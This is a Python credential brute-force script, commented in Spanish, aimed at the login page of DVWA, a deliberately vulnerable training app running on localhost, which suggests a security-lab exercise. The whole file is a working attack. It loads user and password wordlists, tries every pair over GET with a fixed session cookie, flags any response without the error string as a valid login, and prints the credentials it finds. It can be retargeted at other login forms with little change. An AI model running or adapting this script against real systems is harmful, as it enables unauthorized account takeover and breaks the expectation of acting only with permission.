import requests
import time

# 1. Configuración
URL = "http://localhost:4280/vulnerabilities/brute/"
USERS_FILE = "users.txt"
PASS_FILE  = "pass.txt"

# 2. Cabeceras HTTP (importante: PHPSESSID y seguridad)
HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                  "(KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
    "Cookie": "security=low; PHPSESSID=c88ef43b3ede44f31656ebda760eb143"
}

# 3. Leer diccionarios
def load_list(path):
    with open(path, "r") as f:
        return [l.strip() for l in f if l.strip()]

users     = load_list(USERS_FILE)
passwords = load_list(PASS_FILE)

# 4. Fuerza bruta con GET
session = requests.Session()
session.headers.update(HEADERS)

found = []
start = time.time()

for user in users:
    for pwd in passwords:
        # DVWA espera parámetros en GET
        resp = session.get(URL, params={
            "username": user,
            "password": pwd,
            "Login":    "Login"
        })
        # 5. Detectar éxito: si NO aparece el mensaje de error, es válido
        if "Username and/or password incorrect" not in resp.text:
            found.append((user, pwd))
            print(f"[+] Credenciales válidas: {user} / {pwd}")

end = time.time()

print("\n=== RESULTADOS ===")
for u,p in found:
    print(f" • {u}:{p}")
print(f"\nTiempo total de ataque: {end - start:.2f} segundos")
